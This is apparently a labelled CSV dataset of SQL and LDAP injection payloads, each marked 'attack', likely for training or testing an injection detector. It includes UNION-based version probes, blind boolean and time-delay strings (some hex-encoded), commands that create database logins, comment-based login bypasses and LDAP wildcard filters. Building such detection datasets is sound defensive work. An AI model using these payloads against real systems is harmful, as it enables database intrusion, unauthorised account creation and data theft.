label,payload,family
attack,s,other
attack,truncate,other
attack,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",other
attack,"exec sp_addlogin 'name' , 'password'",other
attack,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,other
attack,delete,other
attack,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,other
attack,exec  (  @s  ) ,other
attack,update,other
attack,or   (  EXISTS  ) ,other
attack," union   (  select NULL,   (  select @@version   )    )    --",other
attack," union   (  select NULL, NULL,   (  select @@version   )    )    --",other
attack,"admin""/*",other
attack," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",other
attack,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,other
attack," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",other
attack,desc,other
attack,0x770061006900740066006F0072002000640065006C00 ...,other
attack, or ''-',other
attack, ( ,other
attack,0x730065006c0065006300740020004000400076006500 ...,other
attack,%2A%28%7C%28mail%3D%2A%29%29,other
attack,declare @s varchar  (  200  )   select @s   =   0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,other
attack,"""&""",other
attack,",@variable",other
attack,%2A%7C,other
attack,*  (  |  (  mail  =  *   )    ) ,other
attack,"<>""'%;  )    (  &+",other
attack,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,other
attack,admin' --,other
attack,"""*""",other
attack,*  (  |  (  objectclass  =  *   )    ) ,other
attack,*|,other
attack,# from wapiti,other
attack,1'  )   as oknw where 8777  =  8777,other
attack,"iif  (  7889  =  5114,1,1/0  )  ",other
attack,select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,other
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",other
attack,select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,other
attack,1'||  (  select 'uiyj' from dual where 8320  =  8320,other
attack,"1""   )    )    as osuh where 8809  =  8809",other
attack,1  )   as lisg where 5490  =  5490,other
attack,"1""   )    )    as bbkl where 5686  =  5686",other
attack,1'   )    )    as pgif where 6346  =  6346,other
attack,select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #,other
attack,"1""  )   where 2834  =  2834   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,select case when 6420  =  7941 then 1 else null end--,other
attack,"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",other
attack,-7199'||  (  select 'ssty' where 5406  =  5406 order by 1#,other
attack,"1"" where 7045  =  7045",other
attack,select case when 6229  =  2077 then 1 else null end--,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",other
attack,-2573   )    )    order by 1#,other
attack,1'  )   as bihs where 4197  =  4197,other
attack,1'||  (  select 'fwph' where 3791  =  3791,other
attack,"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,select case when 2599  =  7035 then 1 else null end--,other
attack,1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,other
attack,1'+  (  select qdon where 9453  =  9453,other
attack,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,other
attack,"1""   )    )    as ljhz where 2416  =  2416",other
attack,if  (  8537  =  7034  )   select 8537 else drop function vqmp--,other
attack,1  )   as msat where 1267  =  1267,other
attack,select case when 2640  =  9249 then 1 else null end--,other
attack,1'   )    )    as ypgz where 8704  =  8704,other
attack,1'+  (  select 'feof' where 1966  =  1966,other
attack,"-3169"" order by 1#",other
attack,1   )    )    as xmac where 7692  =  7692,other
attack,select   (  case when   (  3076  =  3596  )   then 3076 else 3076*  (  select 3076 from mysql.db  )   end  )  #,other
attack,1'+  (  select qtyi where 7147  =  7147,other
attack,1   )    )    as quap where 7625  =  7625,other
attack,1'   )    )    as njop where 7001  =  7001,other
attack,"1'||  (  select 'ozki' where 4435  =  4435   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",other
attack,"1"" where 3764  =  3764",other
attack,"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,1'  )   where 9272  =  9272,other
attack,1'   )    )    as plgq where 1121  =  1121,other
attack,"1""   )    )    as fjtv where 8904  =  8904",other
attack,1',other
